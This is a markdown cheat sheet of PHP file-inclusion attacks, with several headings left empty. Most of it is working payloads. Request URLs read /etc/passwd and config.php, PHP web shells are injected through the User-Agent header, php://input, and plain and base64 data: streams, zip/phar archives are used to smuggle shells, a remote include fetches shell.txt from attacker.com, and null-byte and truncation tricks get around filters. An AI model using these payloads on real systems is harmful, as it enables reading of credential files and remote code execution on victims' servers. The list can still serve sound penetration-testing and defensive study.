# Local File Inclusion

## 1) Direct Local Include
```
http://site.com/lfi.php?page=/etc/passwd
```

## 2) php://filter
```
http://www.site.com/lfi.php?page=php://filter/resource=config.php

http://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php
```

## 3) /proc/self/environ
Request's user agent can be found there

```
GET /lfi.php?page=/proc/self/environ&cmd=id HTTP/1.1
Host: www.site.com
User-Agent: <?php echo shell_exec($_GET['cmd']);?>
```

## 4) Including images
If image.jpg contains php code it will be interpreted.

```
http://www.site.com/lfi.php?page=upload/image.jpg
```

## 5) Zip and Phar wrappers
File must be zip archive with any extension

```
http://www.site.com/lfi.php?page=zip://image.zip#shell.php

http://www.site.com/lfi.php?page=phar://image.phar#shell.php

```

## 6) Session Files

## 7) PHPInfo Script

## 8) Temporary Files - Windows

## 9) Logs

# Remote File Inclusion
Works when allow_url_include in php.ini is set to TRUE

## 1) Direct Remote Include
Including php file in text format directly
```
http://www.site.com/lfi.hpp?page=http://attacker.com/shell.txt
```

## 2) Data:text/plain
Including php code through data stream
```
http://www.site.com/lfi.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>

http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=
```

## 3) php://input

```
POST /lfi.php?page=php://input&cmd=cd HTTP/1.1
Host: www.site.com
Content-Lenth: 39

<?php echo shell_exec($_GET['cmd']);?>

```

# Fighting with extensions

## 1) Null Bytes
Add null byte that will terminate string

```
http://www.site.com/lfi.php?page=/etc/passwd%00

http://www.site.com/lfi.php?page=/etc/passwd%2500
```

## 2) Truncation

Cut extension by creating long string
```
http://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd
```

```
http://www.site.com/lfi.php?page=/etc/passwd..............................
```

```
http://www.site.com/lfi.php?page=/etc/passwd.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
```
